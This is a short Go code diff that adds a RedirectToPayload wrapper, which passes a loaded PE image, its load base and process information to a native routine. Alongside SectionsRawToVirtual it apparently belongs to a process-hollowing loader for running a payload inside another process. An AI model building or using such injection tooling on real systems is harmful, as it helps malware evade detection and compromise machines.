@@ -249,3 +249,23 @@ func SectionsRawToVirtual(
 	}
 	return ret != 0
 }
+
+//RedirectToPayload func
+func RedirectToPayload(
+	loadedPE uintptr, loadBase uintptr, pi *syscall.ProcessInformation, is32bit bool,
+) bool {
+	var bitFlag int
+	if is32bit {
+		bitFlag = 1
+	}
+	ret, _, err := procRedirectToPayload.Call(
+		loadedPE,
+		loadBase,
+		uintptr(unsafe.Pointer(pi)),
+		uintptr(bitFlag),
+	)
+	if ret == 0 {
+		log.Println("Error redirect_to_payload: ", err.Error())
+	}
+	return ret != 0
+}
